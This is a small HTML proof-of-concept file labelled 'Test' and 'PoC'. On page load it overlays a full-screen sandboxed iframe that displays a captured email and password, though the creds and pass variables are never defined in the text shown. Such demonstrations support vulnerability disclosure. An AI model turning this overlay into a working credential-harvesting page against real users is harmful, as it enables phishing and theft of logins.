<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Test</title>
  </head>
  <body>
    <script>
      function attack() {
        const iframe = document.createElement("iframe");
        iframe.sandbox =
          "allow-scripts allow-modals allow-popups allow-top-navigation";

        iframe.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border: none;
        z-index: 9999;
    `;

        iframe.srcdoc = `
          <div style="max-width:600px;margin:50px auto;padding:30px;background:#f8f9fa;border-radius:8px">
            <h2 style="color:#ea4335">PoC</h2>
            <div style="background:#e8f0fe;padding:20px;margin:20px 0;border-radius:4px;text-align:left">
              <strong>Email:</strong> <span style="font-family:monospace">${creds}</span><br><br>
              <strong>Password:</strong> <span style="font-family:monospace">${pass}</span>
            </div>
          </div>
        `;

        // Append iframe to the document
        document.body.appendChild(iframe);
      }

      // Execute attack on page load
      window.onload = () => {
        attack();
      };
    </script>
  </body>
</html>
